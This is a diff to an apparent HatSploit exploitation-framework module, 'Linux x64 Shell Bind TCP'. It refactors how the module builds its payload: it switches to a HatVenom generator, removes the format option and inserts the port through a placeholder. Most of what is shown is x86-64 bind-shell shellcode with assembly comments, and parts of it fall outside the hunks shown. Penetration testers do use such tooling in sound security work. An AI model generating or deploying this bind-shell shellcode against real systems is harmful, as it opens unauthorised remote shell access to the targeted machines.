@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Shell Bind TCP",
@@ -55,22 +55,15 @@ class HatSploitPayload(Payload, PayloadGenerator):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        bind_port, executable_format = self.parse_options(self.options)
-        bind_port = self.port_to_bytes(bind_port)
+        bind_port = self.parse_options(self.options)
 
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
+        offsets = {
+            'bport': bind_port
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -85,7 +78,7 @@ class HatSploitPayload(Payload, PayloadGenerator):
             b"\x48\x97"              # xchg   %rax,%rdi
             b"\x52"                  # push   %rdx
             b"\xc7\x04\x24\x02\x00"  # movl   $0xb3150002,(%rsp)
-            + bind_port +            # port
+            b":bport:port:"          # port
             b"\x48\x89\xe6"          # mov    %rsp,%rsi
             b"\x6a\x10"              # pushq  $0x10
             b"\x5a"                  # pop    %rdx
@@ -121,6 +114,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'x64', shellcode)
+        payload = self.generate('elf', 'x64', shellcode, offsets)
 
         return payload
